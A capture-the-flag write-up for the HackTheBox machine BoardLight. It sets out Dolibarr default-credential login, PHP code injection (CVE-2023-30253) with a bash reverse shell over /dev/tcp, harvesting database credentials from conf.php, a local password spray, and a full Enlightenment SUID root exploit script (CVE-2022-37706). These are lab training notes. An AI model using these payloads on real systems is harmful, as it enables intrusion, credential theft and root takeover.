---
render_with_liquid: false
title: HackTheBox Writeup  BoardLight
date: 2024-05-28 00:34:58 +1400
tags: [hackthebox, nmap, linux, feroxbuster, subdomain, gobuster, enum, dolibarr, default-credentials, cve-2023-30253, code-injection, php, webshell, discover-secrets, password-reuse, password-spraying, suid, enlightenment, cve-2022-37706, oscp-like-2023]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/BoardLight]
└─$ pt init '10.129.146.45 board.htb crm.board.htb BoardLight'
+------------+--------+---------------+---------------+
|  PROFILE   | STATUS |      IP       |    DOMAIN     |
+------------+--------+---------------+---------------+
| boardlight | on     | 10.129.146.45 | board.htb     |
| boardlight | on     | 10.129.146.45 | crm.board.htb |
| boardlight | on     | 10.129.146.45 | BoardLight    |
+------------+--------+---------------+---------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue May 28 00:34:58 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, BoardLight
Nmap scan report for BoardLight (10.129.146.45)
Host is up, received user-set (0.29s latency).
Scanned at 2024-05-28 00:34:58 CST for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue May 28 00:35:17 2024 -- 1 IP address (1 host up) scanned in 18.87 seconds
```


## 80 - HTTP : Boardlight (Static site)


### Info

```ruby
http://board.htb [200] [Apache/2.4.41 (Ubuntu)] [56a0d90e33967a685d5fabf4f7881a9126d785de] [Apache HTTP Server:2.4.41,Bootstrap,OWL Carousel,Ubuntu,jQuery]
```

![](/assets/obsidian/f96a9b9a19eebd82a8bb63a507e90521.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/BoardLight]
└─$ cat ferox_80.txt | grep -vE 'board.htb/js/|board.htb/css/|board.htb/images/'
404      GET        1l        3w       16c http://board.htb/portfolio.php
200      GET      294l      633w     9209c http://board.htb/do.php
200      GET      280l      652w     9100c http://board.htb/about.php
200      GET      294l      635w     9426c http://board.htb/contact.php
200      GET      517l     1053w    15949c http://board.htb/index.php
200      GET      517l     1053w    15949c http://board.htb/
```

### Subdomains

```bash
gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost)
```

```bash
Found: crm.board.htb Status: 200 [Size: 6360]
Found: *.board.htb Status: 400 [Size: 301]
```

## 80 - crm.board.htb : Dolibarr 17.0.0


### Info

```ruby
http://crm.board.htb/website/index.php [200] [Login @ 17.0.0] [Apache/2.4.41 (Ubuntu)] [b0a6a5991988fdd7820ae34deadd0c6e3c40d563] [Apache HTTP Server:2.4.41,Ubuntu]
```

![](/assets/obsidian/09289b33c7257a9bb3a52b402132200c.png)

# User Flag
---

## Enumeration


### 80 - PHP : Static site

- Tested the contact form, no request was sent to backend
- Discovered a domain name : `board.htb` from email

![](/assets/obsidian/26f3785f0cdc8194746fd511a737b2d9.png)

## Shell as www-data


### 80 - crm.board.htb : Dolibarr 17.0.0


#### Default credential

- Common credential succeed - `admin`:`admin`

![](/assets/obsidian/53a6b3a6b7e0bdda47974ab18d89a9fc.png)

![](/assets/obsidian/63c309c5cb7700654d2c196143bd7bed.png)

#### PHP Code Injection (CVE-2023-30253)

- Google : `Dolibarr 17.0.0 exploit`

> https://www.swascan.com/security-advisory-dolibarr-17-0-0/

> **Brief exploit explanation**
> - Admin account can create websites, but can't insert `php` codes like `<?php...?>`
> - However, a test function allows php codes to be executed by turning the `php` tag to upper case, example : `<?PHP phpinfo(); ?>`
{: .prompt-tip }

Create a blank website

![](/assets/obsidian/461af2e3a7d3e3a608a3ab2bbeab4f51.png)

![](/assets/obsidian/7b8c3f3de09c40b7090c87ac0d06a974.png)

Click on `add a new page` icon

![](/assets/obsidian/9af17da36c704dd4bd118c4796fce8b1.png)

Select `Or create page from scratch or from a page template...` and set a **Title** : `test`

![](/assets/obsidian/0379bb939b96a19a7c503db7b15d6c78.png)

Click on `create` at the bottom

![](/assets/obsidian/6ca24c35783884a23ee100ab36d2e855.png)

After creating the page, click on `Edit HTML Source`

![](/assets/obsidian/e4273e5b3e48ba130a82cb7db4a5a5c3.png)

Insert `<?PHP phpinfo();?>` in between the `section` tags, then save it

![](/assets/obsidian/67a35a85013493cb4a762499e70da0b9.png)

Enable `Show dynamic content` to make it load php code

![](/assets/obsidian/0bed37436818b6aca4918fdb3a505417.png)

Confirmed that it works

![](/assets/obsidian/288d7b99abca7a1fcd1e55205b382ed6.png)

#### PHP reverse shell

Setup listener

```bash
nc -lvnp 1111
```

Write php reverse shell

- Payload

```php
<?PHP system("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.91/1111 0>&1'"); ?>
```

![](/assets/obsidian/c45fe8f5d7e497cf94d43c10311c7425.png)

After saving it and got redirected to the preview page, we got a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/BoardLight]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.35.196] 39150
/usr/bin/script -qc /bin/bash /dev/null
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/BoardLight]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
9ww-data@boardlight:~/html/crm.board.htb/htdocs/website$ stty rows 50 columns 209
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to larissa


### Harvesting - Dolibarr config file : Database Credentials

- Google : `Dolibarr config location`

![](/assets/obsidian/8de817b3000ae8deb865bdb2fb2ae955.png)

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ cd ../..
www-data@boardlight:~/html/crm.board.htb$ find . -iname "conf.php" 2>/dev/null
./htdocs/conf/conf.php
```

```bash
www-data@boardlight:~/html/crm.board.htb$ cat ./htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

### Password spray

```bash
www-data@boardlight:~/html/crm.board.htb$ PASS='serverfun2$2023!!'; for USER in $(cat /etc/passwd|grep sh$|awk -F: '{print $1}'); do (x=$(echo $PASS | su $USER -c whoami 2>/dev/null); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 2605
[2] 2606
www-data@boardlight:~/html/crm.board.htb$ [+] larissa
```

```bash
www-data@boardlight:~/html/crm.board.htb$ su - larissa
Password:serverfun2$2023!!
larissa@boardlight:~$ id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
```

# Root Flag
---

## From larissa to root


### SUID - Enlightenment : LPE (CVE-2022-37706)

- Binaries with `setuid` bit set and owned by `root` under `/usr/lib/x86_64-linux-gnu/enlightenment/` folder is abnormal

```bash
larissa@boardlight:~$ find / -type f -perm -4000 -exec ls -latr {} + 2>/dev/null
-rwsr-xr-x 1 root root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
-rwsr-xr-x 1 root root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
-rwsr-xr-x 1 root root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-- 1 root dip        395144 Jul 23  2020 /usr/sbin/pppd
-rwsr-xr-- 1 root messagebus  51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root        14728 Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root       477672 Jan  2 09:13 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        68208 Feb  6 04:49 /usr/bin/passwd
-rwsr-xr-x 1 root root        44784 Feb  6 04:49 /usr/bin/newgrp
-rwsr-xr-x 1 root root        88464 Feb  6 04:49 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        53040 Feb  6 04:49 /usr/bin/chsh
-rwsr-xr-x 1 root root        85064 Feb  6 04:49 /usr/bin/chfn
-rwsr-sr-x 1 root root        14488 Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root        39144 Apr  9 08:34 /usr/bin/umount
-rwsr-xr-x 1 root root        67816 Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root        55528 Apr  9 08:34 /usr/bin/mount
```

The binaries were potentially time stomped (`Modify` timestamp ends with `.000000000` )

```bash
larissa@boardlight:~$ stat /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
  File: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
  Size: 26944           Blocks: 56         IO Block: 4096   regular file
Device: 802h/2050d      Inode: 17633       Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-03-19 05:11:00.346565853 -0700
Modify: 2020-01-29 22:23:26.000000000 -0800
Change: 2024-05-17 01:04:37.726605889 -0700
 Birth: -
```

- Google : `linux SUID enlightenment exploit`

> Writeup + POC - https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

> **Brief exploit explanation**
> It's a command injection vulnerability in file path
{: .prompt-info }

> https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh

```bash

#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Exploit manually

```bash
larissa@boardlight:~$ mkdir -p /tmp/net
larissa@boardlight:~$ mkdir -p "/dev/../tmp/;/tmp/e"
larissa@boardlight:~$ echo "/bin/sh" > /tmp/e
larissa@boardlight:~$ chmod a+x /tmp/e
larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/e" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)

# cat /root/root.txt
58e9ba0508bafae521d5141b4ead1260
```

# Additional
---
